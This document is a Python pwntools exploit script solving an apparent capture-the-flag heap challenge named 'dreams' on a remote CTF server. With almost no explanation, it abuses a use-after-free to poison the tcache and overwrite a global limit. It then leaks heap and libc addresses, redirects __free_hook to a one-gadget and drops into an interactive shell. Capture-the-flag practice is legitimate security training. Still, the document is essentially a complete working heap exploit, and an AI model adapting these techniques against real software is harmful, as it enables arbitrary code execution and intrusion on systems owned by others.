from pwn import *


elf=ELF("./dreams")
libc = ELF("./libc.so.6")

pltmalloc = elf.plt.malloc

#p=process("./dreams")
p=remote("challs.actf.co",31227)
#context.terminal = ['tmux', 'splitw', '-h']
#p=gdb.debug("./dreams")#, gdbscript=gs)

def malloc(idx, pay1, pay2):
    global p
    r1 = p.sendlineafter(b"> ", "1")
    r2 = p.sendlineafter(b"keep this dream? ",str(idx))
    r3 = p.sendlineafter(b"yy))? ",pay1)
    r4 = p.sendlineafter(b"you dream about? ", pay2)
    return r1 +r2+r3+r4


def free(idx):
    global p
    r1 = p.sendlineafter(b"> ", "2")
    r2 = p.sendlineafter(b"trading in?",str(idx))
    return r1 +r2

def hack(idx, payload):
    global p
    r1 = p.sendlineafter(b"> ", "3")
    r2 = p.sendlineafter(b"you trouble?",str(idx))
    r3 = p.sendlineafter(b"New date:",payload)
    return r1 +r2+r3

def heapleak(idx):
    global p
    r1 = p.sendlineafter(b"> ", "3")
    r2 = p.sendlineafter(b"you trouble?", str(idx))
    r3 = p.recvuntil(b"you that ")
    leakraw = p.recvuntil(b"\n")[:-1]
    theleak = u64(leakraw + b"\x00"*(8-len(leakraw)))
    p.sendlineafter(b"New date:", b"JUNK")
    return theleak

malloc(0, "junk1", "junk2")
malloc(1, "junk3", "junk4")
free(0)
free(1)
target = 0x404028-32

print(hack(1, p64(target)))
print(malloc(2, "junk5", "junk6"))
malloc(3, b"\xff\xff", b"\xff\xff\xff")
#this set MAX_DREAMS to a large number (0xffffffffffff0a)
#Now I can make a fake chunk of a large enough size to get a glibc leak
malloc(533, "FINDME", "PAY2")
chunkleak = heapleak(533)
heapbase = chunkleak - 4928
print(hex(heapbase))

for i in range(25):
    malloc(10+i, "fake-"+str(i), "fake2-"+str(i))

malloc(35, "free1", "free1p")
malloc(36, "free2", "free2p")
free(35)
free(36)
offset = 4952
targethere = heapbase + offset
#this is 16 bytes before the 10th chunk
hack(36, p64(targethere))
malloc(37, "junk", "junk2")
malloc(38, "junk", p64(0) + p64(0x4b1))
malloc(41, "free1", "free1a")
malloc(42, "free2", "free2a")
free(10)
glibcleak = heapleak(10) #glibc
glibcbase = glibcleak - 2018272
oneg=0xe3b2e
oneg=0xe3b31
onegadget = glibcbase + oneg 
freehook = glibcleak + 8808
print(hex(freehook), "freehook")

free(41)
free(42)
hack(42, p64(freehook-16))
malloc(43, "junk", "junk2")
malloc(44, "junk", p64(0) + p64(onegadget))
p.sendlineafter(b"> ","2")
#p.sendlineafter(b"in?","43")
#free(43)
p.interactive()
